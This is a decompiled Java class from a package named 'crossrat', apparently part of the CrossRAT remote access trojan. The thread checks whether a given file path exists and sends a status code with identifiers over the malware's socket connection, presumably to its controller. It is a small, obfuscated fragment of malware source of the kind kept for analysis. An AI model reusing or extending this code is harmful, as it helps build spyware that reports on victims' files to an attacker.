/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import crossrat.k;
import java.io.DataOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.net.Socket;

final class b
extends Thread {
    private String a;
    private boolean b;
    private String c;

    public b(String string, String string2) {
        this.a = string;
        this.c = string2;
    }

    @Override
    public final void run() {
        Exception exception;
        Object object = new File(this.a);
        DataOutputStream dataOutputStream = null;
        try {
            dataOutputStream = new DataOutputStream(k.k.getOutputStream());
        }
        catch (Exception exception2) {
            exception = exception2;
            exception2.printStackTrace();
        }
        if (object.exists()) {
            this.b = org.a.a.a.b.a((File)object);
            object = this.b ? "1" : "0";
        } else {
            object = "2";
        }
        try {
            dataOutputStream.writeBytes(String.valueOf(k.g) + k.d + k.E + k.d + (String)object + k.d + this.c + k.d + "&&&");
            return;
        }
        catch (Exception exception3) {
            exception = exception3;
            exception3.printStackTrace();
            return;
        }
    }
}
